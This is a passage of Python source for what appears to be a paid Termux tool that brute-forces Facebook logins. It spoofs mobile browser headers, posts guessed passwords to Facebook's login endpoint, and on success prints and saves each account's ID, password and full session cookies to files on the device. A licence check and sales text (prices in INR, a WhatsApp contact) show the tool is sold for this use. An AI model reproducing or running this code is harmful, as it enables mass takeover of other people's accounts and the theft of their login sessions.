                'cache-control': 'max-age=0',
                'dpr': '2.75',
                'referer': 'https://x.facebook.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\33[1;92m[PANKAJ-OK] '+cid+' | '+ps+'\33[0;97m')
                print(f"\033[1;35mCOOKIES💙 : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[PANKAJ-CP] '+cid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M9] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass



class apv():
    def __init__(self):
        self.mainx()
    
    def generate_key(self):
        uuidd = str(os.geteuid()) + str(os.getlogin())
        id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
        plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
        xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
        dev = f'{id}{xp}'
        return dev
    
    def response(self):
        c = pycurl.Curl()
        c.setopt(c.URL, "https://github.com/pk929786")
        buffer = BytesIO()
        c.setopt(c.WRITEDATA, buffer)
        c.setopt(c.CAINFO, certifi.where())
        c.perform()
        c.close()
        body = buffer.getvalue()
        resp = body.decode('iso-8859-1')
        return resp
    
    def mainx(self):
        key = self.generate_key()
        apv_body = self.response()
        if key in apv_body:
            clear()
            print(f" {oo('!')} Your Key is Approved ")
            time.sleep(1)
            menu()
        else:
            clear()
            print(f" {oo('!')} \033[1;91mSubscription Not Available! ")
            print(f" {oo('•')} \033[38;5;122mKey : {key} \033[1;97m")
            print(50*"-")
            print(f" Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")
            print("\n Baray Mehrbani Tool Apni Zimadare May Buy Kary Lehaza May Apko Force Ni Kar Raha ! Baqe Tool Har 1 sy 2 din bad update hgaya kryga ")
            print(50*"-")
            print(f" {oo('•')} 15 Days - 250 INR ")
            print(f" {oo('•')} 30 Days - 450 INR ")
            linex()
            input("[Press Enter To Send Key To Admin]")
            os.system(f"termux-open-url https://wa.me/+919352926965?text={key}")
            exit()

if __name__ == "__main__":
    os.system("clear")
    print(" [•] Join Whatsapp Group ")
    #os.system("xdg-open https://chat.whatsapp.com/DYdXugM4JsqBBBA80MEhjd")
    #time.sleep(1)
    print(" join Facebook Group ")
    #os.system("xdg-open https://facebook.com/groups/1015027396369060/")
    #time.sleep(1)
    print(" Subscribe Yt Channel ")
    #os.system("xdg-open https://www.youtube.com/@DevKushwaha14")
   # time.sleep(1)
    bt=uname().machine.lower()
    if 'aarch' in bt:
    	print(' [•] Your Device is 64bit (sported) ')
    else:
    	exit('Sorry This Tools Not Working 32 Bit Device')
    time.sleep(2)
    #sec()
    #apv()
    menu()
    
